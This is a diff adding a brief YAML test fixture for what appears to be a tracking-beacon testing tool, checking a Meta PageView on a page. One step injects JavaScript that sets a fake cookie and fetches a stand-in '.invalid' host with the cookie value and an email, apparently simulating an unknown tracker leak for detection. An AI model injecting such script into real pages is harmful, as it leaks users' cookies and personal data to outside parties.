@@ -1,0 +1,9 @@
+start: /meta-early?em=pw-fixture@example.com
+steps:
+  - wait: 1s
+  - evaluate: "document.cookie = '_pwfake=pw-fixture-cookie-value; path=/'; fetch('https://unknown.pingwright.invalid/x?em=pw-fixture@example.com&c=' + document.cookie.split('=')[1]).then(() => true, () => true)"
+  - wait: 1s
+expect:
+  must:
+    - { vendor: meta, event: PageView }
+options: { seed: 1 }
